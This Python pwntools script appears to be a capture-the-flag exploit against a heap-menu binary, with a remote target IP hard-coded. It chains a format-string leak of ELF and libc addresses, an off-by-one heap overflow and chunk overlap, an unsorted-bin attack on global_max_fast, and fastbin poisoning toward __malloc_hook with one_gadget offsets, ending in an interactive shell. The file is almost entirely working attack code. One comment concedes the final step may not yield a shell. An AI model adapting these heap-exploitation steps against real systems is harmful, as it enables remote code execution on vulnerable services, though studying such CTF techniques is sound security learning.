#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
# context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
def debug():
    binaryname = 'pwn'
    interruptPoint=[0x1016, 0x1142, 0xe60]
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[0])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFaddr = 0
    libcaddr = 0
    for inf in maps.readlines():
        if ELFaddr == 0:
            if binaryname in inf:
                ELFaddr = int(inf.split('-', 1)[0], 16)
        if libcaddr == 0:
            if 'libc' in inf:
                libcaddr = int(inf.split('-', 1)[0], 16)
    info('pid : {}'.format(pid))
    success('elfbase', ELFaddr)
    success('libcbase', libcaddr)
    if len(interruptPoint) :
        for p in interruptPoint:
            success('interruptPoint', p+ELFaddr)
    raw_input('debug>')

local = 1 
# libc given doesn't have global max fast symble, only for local libc in docker

if local:
    io = process('./pwn1')
    libc = ELF('/glibc/2.23/64/lib/libc-2.23.so')
    # global_max_fast = 0x39d848
    onegadget = 0x3f3d6
    onegadget = 0x3f42a
    onegadget = 0xd5bf7
    mallochook = 0x39bb10


else:
    # io = process('./pwn1'  , env = {'LD_PRELOAD':'./libc-2.23.so'})
    io = remote('47.108.135.45', 20354)
    libc = ELF('./libc-2.23.so')

elf = ELF('./pwn1')

def add(index, size, content):
    io.sendlineafter('>> ', '1')
    info('add {}'.format(index))
    io.sendlineafter('):', str(index))
    io.sendlineafter('size:\n', str(size))
    io.sendlineafter('tent: \n', content)

def edit(index, content, line = 1):
    io.sendlineafter('>> ', '4')
    info('edit({})'.format(index))
    io.sendlineafter('index:\n', str(index))
    if line:
        io.sendlineafter('content: \n', content)
    else:
        io.sendafter('content: \n', content)

def delete(index):
    io.sendlineafter('>> ', '2')
    info('delete({})'.format(index))
    io.sendlineafter('index:\n', str(index))

if __name__ == '__main__':
    io.recvuntil('name: ')
    # gdb.attach(io)
    # debug()
    io.sendline('%11$p><%15$p\n')
    mainaddr = int(io.recvuntil('><', drop = True)[-14:], 16)-28
    elfbase = mainaddr - 0x116a
    success('elfbase', elfbase)

    # io.recvuntil('><')
    lsm = int(io.recv(14), 16) - 240
    libcbase = lsm - libc.sym['__libc_start_main']
    success('libcbase', libcbase)
    libc.address = libcbase
    sys = libc.sym['system']
    success('system', sys)
    global_max_fast = libc.sym['global_max_fast']
    success('global_max_fast', global_max_fast)
    onegadget = onegadget + libcbase
    success('onegadget', onegadget)
    
    add(0, 0x88, 'a' * 0x87)
    add(1, 0x88, 'b' * 0x87)
    add(2, 0x88, 'c' * 0x87)
    add(3, 0x88, 'd' * 0x87)

    debug()
    edit(0, 'A' * 0x88 + '\xf1', line = 0)
    payload = 'C' * (0xf0 -0x10 - 0x90)
    payload += p64(0) + p64(0x90 + 0x30 + 1)
    edit(2, payload)
    delete(1)
    add(1, 0xd0, 'B' * 0x80)
    delete(2)

    # change bk to global_max_fast - 0x10
    payload = 'a' * 0x88 + p64(0x91) + p64(global_max_fast - 0x10) * 2
    edit(1, payload)
    add(2, 0x88, 'CCCC')
    info('now, global_max_fast should be changed')

    delete(2)
    info('2 should in fast bin, size = 0x90')
    '''
    pwndbg> telescope 0x39bb10+0x7fe629d28000-0x80 30
    00:0000│   0x7fe62a0c3a90 (_IO_wide_data_0+208) ◂— 0x0
    ... ↓
    0c:0060│   0x7fe62a0c3af0 (_IO_wide_data_0+304) —▸ 0x7fe62a0c2260 (__GI__IO_wfile_jumps) ◂— 0x0
    0d:0068│   0x7fe62a0c3af8 ◂— 0x0
    0e:0070│   0x7fe62a0c3b00 (__memalign_hook) —▸ 0x7fe629da1b00 (memalign_hook_ini) ◂— sub    rsp, 0x18
    0f:0078│   0x7fe62a0c3b08 (__realloc_hook) —▸ 0x7fe629da1aa0 (realloc_hook_ini) ◂— mov    rax, qword ptr [rip + 0x321449]
    10:0080│   0x7fe62a0c3b10 (__malloc_hook) ◂— 0x0

    '''
    # chunk can be extract to fastbin, and fd can be rewriten
    # but the size is limited so can't get shell successfully
    fakeFD = libcbase + mallochook - 0x50
    payload = 'A' * 0x88 + p64(0x91) + p64(fakeFD)
    edit(1, payload)
    info('fd of 2 is changed')
    add(2, 0x88, 'cccc')
    add(4, 0x88, payload)

    add(5, 0xa0, 'get shell!')

    io.interactive()
    io.close()








